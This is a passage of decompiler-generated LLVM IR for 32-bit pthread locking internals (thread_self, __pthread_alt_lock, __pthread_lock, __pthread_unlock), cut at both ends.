  br i1 %v1_804cd4d, label %dec_label_pc_804cccf.backedge, label %dec_label_pc_804cd4f

dec_label_pc_804cd4f:                             ; preds = %dec_label_pc_804cd46
  %v2_804cd4f = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_804cd4f, i32* @edx, align 4
  %v0_804cd52 = load i32, i32* @esi, align 4
  store i32 %v0_804cd52, i32* @eax, align 4
  %v0_804cd54 = load i32, i32* @edi, align 4
  store i32 %v0_804cd54, i32* @ecx, align 4
  %v0_804cd56 = call i32 @wait_node_dequeue()
  %v0_804cd5b = load i32, i32* @edi, align 4
  %v1_804cd5b = add i32 %v0_804cd5b, 4
  %v2_804cd5b = inttoptr i32 %v1_804cd5b to i32*
  %v3_804cd5b = load i32, i32* %v2_804cd5b, align 4
  store i32 %v3_804cd5b, i32* @eax, align 4
  %v2_804cd61 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cd61, i32* @ebx, align 4
  %v0_804cd65 = call i32 @restart.3()
  br label %dec_label_pc_804cd6a

dec_label_pc_804cd6a.loopexit:                    ; preds = %dec_label_pc_804ccd6
  br label %dec_label_pc_804cd6a

dec_label_pc_804cd6a:                             ; preds = %dec_label_pc_804cd6a.loopexit, %dec_label_pc_804cd4f
  %v0_804cd71 = phi i32 [ %v2_804cccf, %dec_label_pc_804cd6a.loopexit ], [ %v0_804cd65, %dec_label_pc_804cd4f ]
  store i32 %v0_804ccc6, i32* @esi, align 4
  store i32 %v0_804ccc5, i32* @edi, align 4
  store i32 %v0_804ccc4, i32* @ebp, align 4
  ret i32 %v0_804cd71

; uselistorder directives
  uselistorder i32 %stack_var_-24.1.ph46, { 0, 2, 1 }
  uselistorder i32 %v2_804cd35, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804cd17, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804cd15, { 1, 0 }
  uselistorder i32 %v0_804cd3331, { 4, 1, 0, 2, 3, 6, 5 }
  uselistorder i1 %v15_804ccda, { 1, 2, 0 }
  uselistorder i32 %v2_804ccda, { 1, 0 }
  uselistorder i32 %v2_804cccf, { 1, 2, 5, 4, 3, 0, 6 }
  uselistorder i32 %v24_804ccda, { 1, 0, 3, 2, 4 }
  uselistorder i32 ()* @wait_node_dequeue, { 1, 0 }
  uselistorder label %dec_label_pc_804cd3c, { 1, 0 }
  uselistorder label %dec_label_pc_804ccfd.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804cd33, { 1, 0 }
  uselistorder label %dec_label_pc_804cccf.backedge, { 2, 1, 0 }
}

define i32 @thread_self.4() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804cd72 = load i32, i32* @esp, align 4
  %v1_804cd72 = load i32, i32* @global_var_806338c.133, align 4
  %v7_804cd72 = icmp ult i32 %v0_804cd72, %v1_804cd72
  %v1_804cd7f = icmp eq i1 %v7_804cd72, false
  br i1 %v1_804cd7f, label %dec_label_pc_804cdb0, label %dec_label_pc_804cd81

dec_label_pc_804cd81:                             ; preds = %entry
  %v1_804cd81 = load i32, i32* @global_var_8063390.134, align 16
  %v7_804cd81 = icmp ult i32 %v0_804cd72, %v1_804cd81
  br i1 %v7_804cd81, label %dec_label_pc_804cd96, label %dec_label_pc_804cd89

dec_label_pc_804cd89:                             ; preds = %dec_label_pc_804cd81
  %v1_804cd89 = load i32, i32* @global_var_8063394.135, align 4
  %v7_804cd89 = icmp ult i32 %v0_804cd72, %v1_804cd89
  br i1 %v7_804cd89, label %dec_label_pc_804cdb0, label %dec_label_pc_804cd96

dec_label_pc_804cd96:                             ; preds = %dec_label_pc_804cd89, %dec_label_pc_804cd81
  %v0_804cd96 = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804cd96 = icmp eq i32 %v0_804cd96, 0
  br i1 %v1_804cd96, label %dec_label_pc_804cda4, label %dec_label_pc_804cd9f

dec_label_pc_804cd9f:                             ; preds = %dec_label_pc_804cd96
  %v0_804cd9f = call i32 @__pthread_find_self()
  br label %dec_label_pc_804cda4

dec_label_pc_804cda4:                             ; preds = %dec_label_pc_804cd96, %dec_label_pc_804cd9f
  %v2_804cdaa = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804cdb0

dec_label_pc_804cdb0:                             ; preds = %dec_label_pc_804cd89, %entry, %dec_label_pc_804cda4
  %v0_804cdb0 = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804cd89 ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804cdaa, %dec_label_pc_804cda4 ]
  ret i32 %v0_804cdb0

; uselistorder directives
  uselistorder label %dec_label_pc_804cdb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cda4, { 1, 0 }
}

define i32 @suspend.5(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804cdb4 = load i32, i32* @eax, align 4
  %v1_804cdb5 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804cdb4)
  ret i32 %v1_804cdb5
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp9 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804cdbe = load i32, i32* @esi, align 4
  %v0_804cdbf = load i32, i32* @ebx, align 4
  store i32 %v0_804cdbf, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* @esi, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_804cde5 = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_804cdcb

dec_label_pc_804cdcb:                             ; preds = %dec_label_pc_804cde9.dec_label_pc_804cdcb_crit_edge, %entry
  %v0_804cdcb = phi i32 [ %v0_804cdcb.pre, %dec_label_pc_804cde9.dec_label_pc_804cdcb_crit_edge ], [ %tmp9, %entry ]
  %v1_804cdcb = inttoptr i32 %v0_804cdcb to i32*
  %v2_804cdcb = load i32, i32* %v1_804cdcb, align 4
  store i32 %v2_804cdcb, i32* @ebx, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v1_804cdd2 = icmp eq i32 %v2_804cdcb, 0
  br i1 %v1_804cdd2, label %dec_label_pc_804cde9, label %dec_label_pc_804cdd6

dec_label_pc_804cdd6:                             ; preds = %dec_label_pc_804cdcb
  %v0_804cdd6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cdd6 = icmp eq i32 %v0_804cdd6, 0
  %v1_804cdd8 = icmp eq i1 %v1_804cdd6, false
  br i1 %v1_804cdd8, label %dec_label_pc_804cde1, label %dec_label_pc_804cdda

dec_label_pc_804cdda:                             ; preds = %dec_label_pc_804cdd6
  %v0_804cdda = call i32 @thread_self.4()
  store i32 %v0_804cdda, i32* %edx.global-to-local, align 4
  %v0_804cdf7.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cde1

dec_label_pc_804cde1:                             ; preds = %dec_label_pc_804cdd6, %dec_label_pc_804cdda
  %v0_804cdf7.pre = phi i32 [ %v0_804cdcb, %dec_label_pc_804cdd6 ], [ %v0_804cdf7.pre.pre, %dec_label_pc_804cdda ]
  store i32 %v2_804cde5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804cde9

dec_label_pc_804cde9:                             ; preds = %dec_label_pc_804cdcb, %dec_label_pc_804cde1
  %v3_804cdf7 = phi i32 [ 1, %dec_label_pc_804cdcb ], [ %v2_804cde5, %dec_label_pc_804cde1 ]
  %v24_804cdf7 = phi i32 [ %v0_804cdcb, %dec_label_pc_804cdcb ], [ %v0_804cdf7.pre, %dec_label_pc_804cde1 ]
  store i32 %v2_804cdcb, i32* %stack_var_-20, align 4
  %v1_804cdf7 = inttoptr i32 %v24_804cdf7 to i32*
  %v2_804cdf7 = load i32, i32* %v1_804cdf7, align 4
  %v15_804cdf7 = icmp eq i32 %v2_804cdcb, %v2_804cdf7
  %v22_804cdf7 = select i1 %v15_804cdf7, i32 %v3_804cdf7, i32 %v2_804cdf7
  store i32 %v22_804cdf7, i32* %v1_804cdf7, align 4
  %v1_804cdfb = zext i1 %v15_804cdf7 to i32
  %v2_804cdfb = load i32, i32* %ecx.global-to-local, align 4
  %v3_804cdfb = and i32 %v2_804cdfb, -256
  %v4_804cdfb = or i32 %v3_804cdfb, %v1_804cdfb
  store i32 %v4_804cdfb, i32* @ecx, align 4
  %v4_804cdfe = icmp eq i1 %v15_804cdf7, false
  br i1 %v4_804cdfe, label %dec_label_pc_804cde9.dec_label_pc_804cdcb_crit_edge, label %dec_label_pc_804ce02

dec_label_pc_804cde9.dec_label_pc_804cdcb_crit_edge: ; preds = %dec_label_pc_804cde9
  %v0_804cdcb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cdcb

dec_label_pc_804ce02:                             ; preds = %dec_label_pc_804cde9
  br i1 %v1_804cdd2, label %dec_label_pc_804ce0d, label %dec_label_pc_804ce06

dec_label_pc_804ce06:                             ; preds = %dec_label_pc_804ce02
  %v0_804ce06 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804ce06, i32* @eax, align 4
  %v0_804ce08 = load i32, i32* %stack_var_-20, align 4
  %v2_804ce08 = call i32 @suspend.5(i32 %v0_804ce08, i32 0)
  br label %dec_label_pc_804ce0d

dec_label_pc_804ce0d:                             ; preds = %dec_label_pc_804ce02, %dec_label_pc_804ce06
  %v0_804ce12 = phi i32 [ 0, %dec_label_pc_804ce02 ], [ %v2_804ce08, %dec_label_pc_804ce06 ]
  %v2_804ce10 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ce10, i32* @ebx, align 4
  store i32 %v0_804cdbe, i32* @esi, align 4
  ret i32 %v0_804ce12

; uselistorder directives
  uselistorder i1 %v15_804cdf7, { 1, 2, 0 }
  uselistorder i32 %v2_804cdf7, { 1, 0 }
  uselistorder i32 %v0_804cdcb, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ce0d, { 1, 0 }
  uselistorder label %dec_label_pc_804cde9, { 1, 0 }
  uselistorder label %dec_label_pc_804cde1, { 1, 0 }
}

define i32 @__pthread_lock(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_804ce14 = load i32, i32* @edi, align 4
  %v0_804ce15 = load i32, i32* @edx, align 4
  store i32 %v0_804ce15, i32* @edi, align 4
  %v0_804ce17 = load i32, i32* @esi, align 4
  %v0_804ce18 = load i32, i32* @ebx, align 4
  %v0_804ce19 = load i32, i32* @eax, align 4
  store i32 %v0_804ce19, i32* @ebx, align 4
  %v1_804ce1e = inttoptr i32 %v0_804ce19 to i32*
  %v2_804ce1e = load i32, i32* %v1_804ce1e, align 4
  %v3_804ce1e = icmp eq i32 %v2_804ce1e, 0
  %v1_804ce21 = icmp eq i1 %v3_804ce1e, false
  br i1 %v1_804ce21, label %dec_label_pc_804ce37, label %dec_label_pc_804ce23

dec_label_pc_804ce23:                             ; preds = %entry
  store i32 0, i32* @ecx, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804ce2c = load i32, i32* %v1_804ce1e, align 4
  %v15_804ce2c = icmp eq i32 %v2_804ce2c, 0
  %v22_804ce2c = select i1 %v15_804ce2c, i32 1, i32 %v2_804ce2c
  store i32 %v22_804ce2c, i32* %v1_804ce1e, align 4
  %v1_804ce30 = zext i1 %v15_804ce2c to i32
  %v2_804ce30 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ce30 = and i32 %v2_804ce30, -256
  %v4_804ce30 = or i32 %v3_804ce30, %v1_804ce30
  store i32 %v4_804ce30, i32* %edx.global-to-local, align 4
  %v4_804ce33 = icmp eq i1 %v15_804ce2c, false
  %v1_804ce35 = icmp eq i1 %v4_804ce33, false
  br i1 %v1_804ce35, label %dec_label_pc_804ce96, label %dec_label_pc_804ce37

dec_label_pc_804ce37:                             ; preds = %dec_label_pc_804ce23, %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ce39

dec_label_pc_804ce39:                             ; preds = %dec_label_pc_804ce68, %dec_label_pc_804ce86, %dec_label_pc_804ce79.preheader, %dec_label_pc_804ce37
  %v0_804ce39 = load i32, i32* @ebx, align 4
  %v1_804ce39 = inttoptr i32 %v0_804ce39 to i32*
  %v2_804ce39 = load i32, i32* %v1_804ce39, align 4
  store i32 %v2_804ce39, i32* @esi, align 4
  %v1_804ce3b = urem i32 %v2_804ce39, 2
  %v2_804ce3b = icmp eq i32 %v1_804ce3b, 0
  %v1_804ce41 = icmp eq i1 %v2_804ce3b, false
  br i1 %v1_804ce41, label %dec_label_pc_804ce4f, label %dec_label_pc_804ce43

dec_label_pc_804ce43:                             ; preds = %dec_label_pc_804ce39
  store i32 %v2_804ce39, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_804ce61.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ce61

dec_label_pc_804ce4f:                             ; preds = %dec_label_pc_804ce39
  %v0_804ce4f = load i32, i32* @edi, align 4
  %v1_804ce4f = icmp eq i32 %v0_804ce4f, 0
  %v1_804ce51 = icmp eq i1 %v1_804ce4f, false
  br i1 %v1_804ce51, label %dec_label_pc_804ce5a, label %dec_label_pc_804ce53

dec_label_pc_804ce53:                             ; preds = %dec_label_pc_804ce4f
  %v0_804ce53 = call i32 @thread_self.4()
  store i32 %v0_804ce53, i32* @edi, align 4
  br label %dec_label_pc_804ce5a

dec_label_pc_804ce5a:                             ; preds = %dec_label_pc_804ce4f, %dec_label_pc_804ce53
  %v0_804ce5a = phi i32 [ %v0_804ce4f, %dec_label_pc_804ce4f ], [ %v0_804ce53, %dec_label_pc_804ce53 ]
  store i32 %v0_804ce5a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ce61

dec_label_pc_804ce61:                             ; preds = %dec_label_pc_804ce43, %dec_label_pc_804ce5a
  %v1_804ce65 = phi i32 [ %v0_804ce61.pre, %dec_label_pc_804ce43 ], [ %v0_804ce5a, %dec_label_pc_804ce5a ]
  %v0_804ce43.sink = phi i32 [ %v2_804ce39, %dec_label_pc_804ce43 ], [ %v0_804ce5a, %dec_label_pc_804ce5a ]
  %v1_804ce4a = or i32 %v0_804ce43.sink, 1
  store i32 %v1_804ce4a, i32* %ecx.global-to-local, align 4
  %v1_804ce61 = icmp eq i32 %v1_804ce65, 0
  br i1 %v1_804ce61, label %dec_label_pc_804ce68, label %dec_label_pc_804ce65

dec_label_pc_804ce65:                             ; preds = %dec_label_pc_804ce61
  %v0_804ce65 = load i32, i32* @esi, align 4
  %v2_804ce65 = add i32 %v1_804ce65, 12
  %v3_804ce65 = inttoptr i32 %v2_804ce65 to i32*
  store i32 %v0_804ce65, i32* %v3_804ce65, align 4
  %v3_804ce6a.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ce68

dec_label_pc_804ce68:                             ; preds = %dec_label_pc_804ce61, %dec_label_pc_804ce65
  %v3_804ce6a = phi i32 [ %v1_804ce4a, %dec_label_pc_804ce61 ], [ %v3_804ce6a.pre, %dec_label_pc_804ce65 ]
  %v0_804ce68 = load i32, i32* @esi, align 4
  %v0_804ce6a = load i32, i32* @ebx, align 4
  %v1_804ce6a = inttoptr i32 %v0_804ce6a to i32*
  %v2_804ce6a = load i32, i32* %v1_804ce6a, align 4
  %v15_804ce6a = icmp eq i32 %v0_804ce68, %v2_804ce6a
  %v22_804ce6a = select i1 %v15_804ce6a, i32 %v3_804ce6a, i32 %v2_804ce6a
  store i32 %v22_804ce6a, i32* %v1_804ce6a, align 4
  %v1_804ce6e = zext i1 %v15_804ce6a to i32
  %v2_804ce6e = load i32, i32* %ecx.global-to-local, align 4
  %v3_804ce6e = and i32 %v2_804ce6e, -256
  %v4_804ce6e = or i32 %v3_804ce6e, %v1_804ce6e
  store i32 %v4_804ce6e, i32* @ecx, align 4
  %v4_804ce71 = icmp eq i1 %v15_804ce6a, false
  br i1 %v4_804ce71, label %dec_label_pc_804ce39, label %dec_label_pc_804ce75

dec_label_pc_804ce75:                             ; preds = %dec_label_pc_804ce68
  %v0_804ce75 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ce75 = icmp eq i32 %v0_804ce75, 0
  %v1_804ce77 = icmp eq i1 %v1_804ce75, false
  br i1 %v1_804ce77, label %dec_label_pc_804ce90.preheader, label %dec_label_pc_804ce79.preheader

dec_label_pc_804ce90.preheader:                   ; preds = %dec_label_pc_804ce75
  %v0_804ce9014 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ce9015 = add i32 %v0_804ce9014, -1
  store i32 %v1_804ce9015, i32* %ebp.global-to-local, align 4
  %v10_804ce9121 = icmp eq i32 %v0_804ce9014, 0
  %v1_804ce9423 = icmp eq i1 %v10_804ce9121, false
  br i1 %v1_804ce9423, label %dec_label_pc_804ce89, label %dec_label_pc_804ce96

dec_label_pc_804ce79.preheader:                   ; preds = %dec_label_pc_804ce75
  %v0_804ce79.pre = load i32, i32* @edi, align 4
  store i32 %v0_804ce79.pre, i32* @eax, align 4
  %v2_804ce7b24 = call i32 @suspend.5(i32 %v0_804ce18, i32 %v0_804ce17)
  %v0_804ce8025 = load i32, i32* @edi, align 4
  %v1_804ce8026 = add i32 %v0_804ce8025, 12
  %v2_804ce8027 = inttoptr i32 %v1_804ce8026 to i32*
  %v3_804ce8028 = load i32, i32* %v2_804ce8027, align 4
  %v4_804ce8029 = icmp eq i32 %v3_804ce8028, 0
  br i1 %v4_804ce8029, label %dec_label_pc_804ce39, label %dec_label_pc_804ce86

dec_label_pc_804ce86:                             ; preds = %dec_label_pc_804ce79.preheader, %dec_label_pc_804ce86
  %v0_804ce8031 = phi i32 [ %v0_804ce80, %dec_label_pc_804ce86 ], [ %v0_804ce8025, %dec_label_pc_804ce79.preheader ]
  %v0_804ce86 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ce86 = add i32 %v0_804ce86, 1
  store i32 %v1_804ce86, i32* %ebp.global-to-local, align 4
  store i32 %v0_804ce8031, i32* @eax, align 4
  %v2_804ce7b = call i32 @suspend.5(i32 %v0_804ce18, i32 %v0_804ce17)
  %v0_804ce80 = load i32, i32* @edi, align 4
  %v1_804ce80 = add i32 %v0_804ce80, 12
  %v2_804ce80 = inttoptr i32 %v1_804ce80 to i32*
  %v3_804ce80 = load i32, i32* %v2_804ce80, align 4
  %v4_804ce80 = icmp eq i32 %v3_804ce80, 0
  br i1 %v4_804ce80, label %dec_label_pc_804ce39, label %dec_label_pc_804ce86

dec_label_pc_804ce89:                             ; preds = %dec_label_pc_804ce90.preheader, %dec_label_pc_804ce89
  %v0_804ce89 = load i32, i32* @edi, align 4
  store i32 %v0_804ce89, i32* @eax, align 4
  %v0_804ce8b = call i32 @restart.3()
  %v0_804ce90 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ce90 = add i32 %v0_804ce90, -1
  store i32 %v1_804ce90, i32* %ebp.global-to-local, align 4
  %v10_804ce91 = icmp eq i32 %v0_804ce90, 0
  %v1_804ce94 = icmp eq i1 %v10_804ce91, false
  br i1 %v1_804ce94, label %dec_label_pc_804ce89, label %dec_label_pc_804ce96

dec_label_pc_804ce96:                             ; preds = %dec_label_pc_804ce90.preheader, %dec_label_pc_804ce89, %dec_label_pc_804ce23
  %v0_804ce9d = phi i32 [ %v2_804ce2c, %dec_label_pc_804ce23 ], [ %v0_804ce68, %dec_label_pc_804ce90.preheader ], [ %v0_804ce8b, %dec_label_pc_804ce89 ]
  store i32 %v0_804ce18, i32* @ebx, align 4
  store i32 %v0_804ce17, i32* @esi, align 4
  store i32 %v0_804ce14, i32* @edi, align 4
  ret i32 %v0_804ce9d

; uselistorder directives
  uselistorder i32 %v0_804ce80, { 1, 0 }
  uselistorder i1 %v15_804ce6a, { 1, 2, 0 }
  uselistorder i32 %v2_804ce6a, { 1, 0 }
  uselistorder i32 %v0_804ce5a, { 1, 0, 2 }
  uselistorder i32 %v2_804ce39, { 2, 1, 0, 3 }
  uselistorder i1 %v15_804ce2c, { 1, 0, 2 }
  uselistorder i32 %v2_804ce2c, { 0, 2, 1 }
  uselistorder i32 %v0_804ce18, { 1, 2, 0 }
  uselistorder i32 %v0_804ce17, { 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder label %dec_label_pc_804ce96, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ce89, { 1, 0 }
  uselistorder label %dec_label_pc_804ce86, { 1, 0 }
  uselistorder label %dec_label_pc_804ce68, { 1, 0 }
  uselistorder label %dec_label_pc_804ce61, { 1, 0 }
  uselistorder label %dec_label_pc_804ce5a, { 1, 0 }
  uselistorder label %dec_label_pc_804ce39, { 1, 2, 0, 3 }
}

define i32 @__pthread_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp27 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804cea1 = load i32, i32* @ebx, align 4
  store i32 %v0_804cea1, i32* %stack_var_-16, align 4
  store i32 %tmp27, i32* @ecx, align 4
  br label %dec_label_pc_804ceba

dec_label_pc_804ceab:                             ; preds = %dec_label_pc_804ceba
  %v2_804ceaf = load i32, i32* %v1_804ceba, align 4
  %v15_804ceaf = icmp eq i32 %v2_804ceaf, 1
  %v22_804ceaf = select i1 %v15_804ceaf, i32 0, i32 %v2_804ceaf
  store i32 %v22_804ceaf, i32* %v1_804ceba, align 4
  %v1_804ceb3 = zext i1 %v15_804ceaf to i32
  %v2_804ceb3 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ceb3 = and i32 %v2_804ceb3, -256
  %v4_804ceb3 = or i32 %v3_804ceb3, %v1_804ceb3
  store i32 %v4_804ceb3, i32* @edx, align 4
  %v4_804ceb6 = icmp eq i1 %v15_804ceaf, false
  %v1_804ceb8 = icmp eq i1 %v4_804ceb6, false
  br i1 %v1_804ceb8, label %dec_label_pc_804cf37.loopexit, label %dec_label_pc_804ceba.backedge

dec_label_pc_804ceba.backedge:                    ; preds = %dec_label_pc_804ceab, %dec_label_pc_804cef6
  %v0_804ceba.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ceba

dec_label_pc_804ceba:                             ; preds = %dec_label_pc_804ceba.backedge, %entry
  %v0_804ceaf = phi i32 [ %v0_804ceba.pre, %dec_label_pc_804ceba.backedge ], [ %tmp27, %entry ]
  %v1_804ceba = inttoptr i32 %v0_804ceaf to i32*
  %v2_804ceba = load i32, i32* %v1_804ceba, align 4
  store i32 %v2_804ceba, i32* %edx.global-to-local, align 4
  %v9_804cebc = icmp eq i32 %v2_804ceba, 1
  br i1 %v9_804cebc, label %dec_label_pc_804ceab, label %dec_label_pc_804cec1

dec_label_pc_804cec1:                             ; preds = %dec_label_pc_804ceba
  %v1_804cec3 = and i32 %v2_804ceba, -2
  store i32 %v1_804cec3, i32* %edi.global-to-local, align 4
  %v1_804ceee3 = icmp eq i32 %v1_804cec3, 0
  %v1_804cef010 = icmp eq i1 %v1_804ceee3, false
  br i1 %v1_804cef010, label %dec_label_pc_804ced6, label %dec_label_pc_804cef6

dec_label_pc_804ced6:                             ; preds = %dec_label_pc_804cec1, %dec_label_pc_804cee5
  %v0_804cef225 = phi i32 [ %v0_804cef224, %dec_label_pc_804cee5 ], [ %v0_804ceaf, %dec_label_pc_804cec1 ]
  %v0_804cedf = phi i32 [ %v1_804cee5, %dec_label_pc_804cee5 ], [ %v0_804ceaf, %dec_label_pc_804cec1 ]
  %v0_804cee5 = phi i32 [ %v1_804ceeb, %dec_label_pc_804cee5 ], [ %v1_804cec3, %dec_label_pc_804cec1 ]
  %stack_var_-32.111 = phi i32 [ %stack_var_-32.0, %dec_label_pc_804cee5 ], [ 0, %dec_label_pc_804cec1 ]
  %v1_804ced6 = add i32 %v0_804cee5, 24
  %v2_804ced6 = inttoptr i32 %v1_804ced6 to i32*
  %v3_804ced6 = load i32, i32* %v2_804ced6, align 4
  %v5_804cedd = icmp slt i32 %v3_804ced6, %stack_var_-32.111
  br i1 %v5_804cedd, label %dec_label_pc_804cee5, label %dec_label_pc_804cedf

dec_label_pc_804cedf:                             ; preds = %dec_label_pc_804ced6
  br label %dec_label_pc_804cee5

dec_label_pc_804cee5:                             ; preds = %dec_label_pc_804ced6, %dec_label_pc_804cedf
  %v0_804cef224 = phi i32 [ %v0_804cef225, %dec_label_pc_804ced6 ], [ %v0_804cedf, %dec_label_pc_804cedf ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.111, %dec_label_pc_804ced6 ], [ %v3_804ced6, %dec_label_pc_804cedf ]
  %v1_804cee5 = add i32 %v0_804cee5, 12
  %v2_804cee8 = inttoptr i32 %v1_804cee5 to i32*
  %v3_804cee8 = load i32, i32* %v2_804cee8, align 4
  %v1_804ceeb = and i32 %v3_804cee8, -2
  %v1_804ceee = icmp eq i32 %v1_804ceeb, 0
  %v1_804cef0 = icmp eq i1 %v1_804ceee, false
  br i1 %v1_804cef0, label %dec_label_pc_804ced6, label %dec_label_pc_804cef2

dec_label_pc_804cef2:                             ; preds = %dec_label_pc_804cee5
  %v12_804cef2 = icmp eq i32 %v0_804cef224, %v0_804ceaf
  %v1_804cef4 = icmp eq i1 %v12_804cef2, false
  br i1 %v1_804cef4, label %dec_label_pc_804cf0b, label %dec_label_pc_804cef6

dec_label_pc_804cef6:                             ; preds = %dec_label_pc_804cec1, %dec_label_pc_804cef2
  %v1_804cef6 = add i32 %v1_804cec3, 12
  %v2_804cef6 = inttoptr i32 %v1_804cef6 to i32*
  %v3_804cef6 = load i32, i32* %v2_804cef6, align 4
  %v1_804cefb = and i32 %v3_804cef6, -2
  store i32 %v1_804cefb, i32* @ebx, align 4
  %v2_804cefe = load i32, i32* %v1_804ceba, align 4
  %v15_804cefe = icmp eq i32 %v2_804ceba, %v2_804cefe
  %v22_804cefe = select i1 %v15_804cefe, i32 %v1_804cefb, i32 %v2_804cefe
  store i32 %v22_804cefe, i32* %v1_804ceba, align 4
  %v1_804cf02 = zext i1 %v15_804cefe to i32
  %v2_804cf02 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cf02 = and i32 %v2_804cf02, -256
  %v4_804cf02 = or i32 %v3_804cf02, %v1_804cf02
  store i32 %v4_804cf02, i32* %edx.global-to-local, align 4
  %v4_804cf05 = icmp eq i1 %v15_804cefe, false
  br i1 %v4_804cf05, label %dec_label_pc_804ceba.backedge, label %dec_label_pc_804cf29

dec_label_pc_804cf0b:                             ; preds = %dec_label_pc_804cef2
  %v1_804cf0b = inttoptr i32 %v0_804cef224 to i32*
  %v2_804cf0b = load i32, i32* %v1_804cf0b, align 4
  %v1_804cf0d = and i32 %v2_804cf0b, -2
  store i32 %v1_804cf0d, i32* %edi.global-to-local, align 4
  %v1_804cf10 = add i32 %v1_804cf0d, 12
  %v2_804cf10 = inttoptr i32 %v1_804cf10 to i32*
  %v3_804cf10 = load i32, i32* %v2_804cf10, align 4
  store i32 %v3_804cf10, i32* %v1_804cf0b, align 4
  br label %dec_label_pc_804cf15

dec_label_pc_804cf15:                             ; preds = %dec_label_pc_804cf15, %dec_label_pc_804cf0b
  %v0_804cf15 = load i32, i32* @ecx, align 4
  %v1_804cf15 = inttoptr i32 %v0_804cf15 to i32*
  %v2_804cf15 = load i32, i32* %v1_804cf15, align 4
  store i32 %v2_804cf15, i32* %edx.global-to-local, align 4
  %v1_804cf1b = and i32 %v2_804cf15, -2
  store i32 %v1_804cf1b, i32* @ebx, align 4
  %v2_804cf1e = load i32, i32* %v1_804cf15, align 4
  %v15_804cf1e = icmp eq i32 %v2_804cf15, %v2_804cf1e
  %v22_804cf1e = select i1 %v15_804cf1e, i32 %v1_804cf1b, i32 %v2_804cf1e
  store i32 %v22_804cf1e, i32* %v1_804cf15, align 4
  %v1_804cf22 = zext i1 %v15_804cf1e to i32
  %v2_804cf22 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cf22 = and i32 %v2_804cf22, -256
  %v4_804cf22 = or i32 %v3_804cf22, %v1_804cf22
  store i32 %v4_804cf22, i32* %edx.global-to-local, align 4
  %v4_804cf25 = icmp eq i1 %v15_804cf1e, false
  br i1 %v4_804cf25, label %dec_label_pc_804cf15, label %dec_label_pc_804cf29

dec_label_pc_804cf29:                             ; preds = %dec_label_pc_804cef6, %dec_label_pc_804cf15
  %v0_804cf29 = load i32, i32* %edi.global-to-local, align 4
  %v1_804cf29 = add i32 %v0_804cf29, 12
  %v2_804cf29 = inttoptr i32 %v1_804cf29 to i32*
  store i32 0, i32* %v2_804cf29, align 4
  %v0_804cf30 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804cf30, i32* @eax, align 4
  %v0_804cf32 = call i32 @restart.3()
  br label %dec_label_pc_804cf37

dec_label_pc_804cf37.loopexit:                    ; preds = %dec_label_pc_804ceab
  br label %dec_label_pc_804cf37

dec_label_pc_804cf37:                             ; preds = %dec_label_pc_804cf37.loopexit, %dec_label_pc_804cf29
  %v2_804cf3c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cf3c, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
